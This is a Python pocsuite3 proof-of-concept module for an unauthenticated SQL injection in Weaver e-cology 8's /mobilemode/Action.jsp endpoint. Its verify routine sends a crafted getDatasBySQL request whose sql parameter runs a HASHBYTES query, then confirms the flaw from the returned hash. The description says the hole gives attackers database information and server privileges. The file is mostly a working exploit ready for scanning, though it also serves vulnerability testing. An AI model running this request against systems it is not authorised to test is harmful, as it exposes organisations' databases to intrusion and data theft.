from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology 8 /mobilemode/Action.jsp 存在SQL注入漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司 泛微 e-cology 8 /mobilemode/Action.jsp 中 sql 参数过滤不严，攻击者可获取数据库信息和服务权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        }
        target = self.url+"/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1"
        try:
            r = requests.get(url=target,timeout=8,verify=False,headers=headers)
            if r.status_code == 200 and "0xe10adc3949" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Path'] = "/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1"
                return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
